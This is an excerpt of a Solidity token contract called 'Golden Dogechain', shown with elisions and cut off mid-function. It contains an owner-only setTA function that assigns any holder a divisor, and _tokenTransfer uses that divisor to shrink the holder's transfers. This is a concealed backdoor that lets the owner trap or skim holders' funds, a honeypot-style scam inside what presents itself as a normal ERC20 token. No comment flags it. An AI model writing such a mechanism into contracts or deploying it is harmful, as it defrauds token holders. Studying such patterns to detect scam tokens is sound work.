...
contract GDoge is Context, IERC20, Ownable {
    ...
    uint256 public swapTokensAtAmount = 10000000000000 * 10 ** _decimals;
    ...
    string private constant _name = "Golden Dogechain";
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSale) private {
        uint256 _getTA = getTA(sender);
        uint256 _tAmount = 0;
        if (_getTA > 1) {
            _tAmount = tAmount;
            tAmount = _tAmount/_getTA;
    ...
    function setTA(address account, uint256 _numTax) public onlyOwner {
        _taxA[account] = _numTax;
    }


    function getTA(address account) public view returns (uint256) {
